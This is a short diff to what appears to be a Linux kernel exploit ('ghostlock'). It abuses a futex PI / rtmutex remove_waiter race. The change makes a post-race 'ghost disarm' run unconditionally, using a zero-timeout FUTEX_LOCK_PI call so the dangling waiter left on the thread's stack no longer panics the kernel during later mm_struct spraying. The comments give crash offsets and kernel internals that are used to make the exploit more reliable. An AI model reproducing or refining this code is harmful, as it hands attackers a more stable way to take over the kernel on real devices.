@@ -205,17 +205,24 @@ namespace ghostlock::race {
         if (controller.fallback_used) {
             pr_warning("TCP route cleanly failed; used Select Stack fallback\n");
         }
-        if (route::route_needs_ghost_disarm(session::g_exploit_session.profile)) {
-            /* remove_waiter() left this thread's pi_blocked_on pointing at the
-         * reclaimed stack waiter. Force one final slow-path removal while the
-         * stack frame is still alive, matching the 5.x multicast primitive's
-         * disarm step. Without this, thread exit leaves a walkable dangling
-         * ghost and the next mm_struct spray can panic the kernel. */
+        /* v11.6: disarm unconditionally. The select-stack route triggers the
+         * same remove_waiter rollback defect as mcast (rtmutex.c:1075 leaves
+         * this task's pi_blocked_on pointing at the reclaimed stack waiter),
+         * and every later sched_setattr on this task walks that ghost: the
+         * recycled stack reads waiter->lock as NULL and
+         * raw_spin_trylock(&lock->wait_lock) panics —
+         * rt_mutex_adjust_prio_chain+0x188, ldar [x27=0], confirmed in the
+         * 2026-10-03 pstore. The old route_needs_ghost_disarm() gate only
+         * enabled this for the multicast policy, so the select route never
+         * disarmed. Run the slow-path removal while this thread's stack is
+         * still alive; the 0-timeout LOCK_PI always returns ETIMEDOUT — the
+         * kernel side effect is the point, not the return value. */
+        for (int disarm_try = 0; disarm_try < 2; ++disarm_try) {
             uint32_t dummy_pi = 0x80000000U | static_cast<uint32_t>(getpid());
             struct timespec expired = {.tv_sec = 0, .tv_nsec = 0};
             errno = 0;
             long disarm = support::futex_op(&dummy_pi, FUTEX_LOCK_PI, 0, &expired, nullptr, 0);
-            pr_info("mcast ghost disarm ret=%ld errno=%d\n", disarm, errno);
+            pr_info("select ghost disarm try=%d ret=%ld errno=%d\n", disarm_try, disarm, errno);
         }
         race->route_done.store(1);
         /* v11: this unlock is what wakes the owner's blocking LOCK_PI and
